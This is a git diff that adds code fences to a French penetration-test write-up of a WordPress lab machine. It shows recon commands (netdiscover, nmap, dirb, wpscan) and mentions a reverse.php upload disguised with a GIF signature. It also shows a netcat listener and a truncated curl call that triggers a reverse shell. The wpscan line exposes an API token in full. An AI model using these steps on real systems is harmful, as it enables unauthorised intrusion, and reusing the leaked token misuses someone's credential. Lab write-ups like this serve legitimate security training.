@@ -17,7 +17,9 @@ L'objectif de ce rapport est d'identifier et d'exploiter les vulnérabilités de
 ### 🔎 Scan du Réseau Local
 Un scan du réseau a été réalisé pour détecter les machines actives à l'aide de `netdiscover` :
 
+```bash
 sudo netdiscover -r 192.168.1.0/24
+```
 
 Une machine avec l’IP `192.168.1.4` a été détectée.
 
@@ -30,7 +32,9 @@ Une machine avec l’IP `192.168.1.4` a été détectée.
 ### 🛠 Scan Nmap
 Un scan approfondi a été réalisé avec `nmap` pour identifier les services exposés et leurs versions :
 
+```bash
 nmap -sS -sC -sV -A -O -vvv 192.168.1.4
+```
 
 **Résultats :**
 | Port | Service | Version |
@@ -59,7 +63,9 @@ En entrant l'adresse `http://192.168.1.4` dans le navigateur, une page web s'aff
 ### 📂 Recherche de Contenus Cachés avec Dirb
 Un scan avec `dirb` a été effectué pour découvrir des répertoires cachés :
 
+```bash
 dirb http://192.168.1.4
+```
 
 **Résultats :**
 - **Répertoire découvert :** `/assets/fonts/blog`
@@ -70,7 +76,9 @@ dirb http://192.168.1.4
 ### 🛠 Ajout d'une Entrée dans le Fichier Hosts
 Pour faciliter l’accès, un alias `blogger.thm` a été ajouté dans le fichier `/etc/hosts` :
 
+```bash
 echo "192.168.1.4 blogger.thm" | sudo tee -a /etc/hosts
+```
 
 ---
 
@@ -80,7 +88,9 @@ echo "192.168.1.4 blogger.thm" | sudo tee -a /etc/hosts
 Un scan approfondi a été réalisé sur WordPress pour détecter les vulnérabilités :
 
 **Commande exécutée :**
+```bash
 wpscan --url http://192.168.1.4/assets/fonts/blog --plugins-detection mixed --enumerate ap --api-token=B4ZGWKhJHufoRPD6PAzqdQlraiSHRxinJF6zzaa6qtY
+```
 
 ---
 
@@ -160,7 +170,9 @@ Dans le fichier `reverse.php`, nous ajoutons une signature GIF pour contourner l
 ### ⏳ Étape 2 : Lancement d’une Écoute sur Kali
 Nous démarrons un listener Netcat sur le port `4444` :
 
+```bash
 nc -lvnp 4444
+```
 
 ![image9](https://github.com/user-attachments/assets/55122fb4-63fc-4e00-b0b8-3cc3cee4f63a)
 
@@ -201,4 +213,3 @@ curl "http://192.168.1.4/assets/fonts/blog/wp-content/uploads/reverse.php?cmd=ba
 3. **Désactiver les plugins inutilisés** et renforcer la configuration des permissions.
 4. **Mettre en place un pare-feu (WAF)** pour filtrer les requêtes malveillantes.
 5. **Auditer régulièrement la sécurité du serveur** pour détecter d’éventuelles nouvelles failles.
-
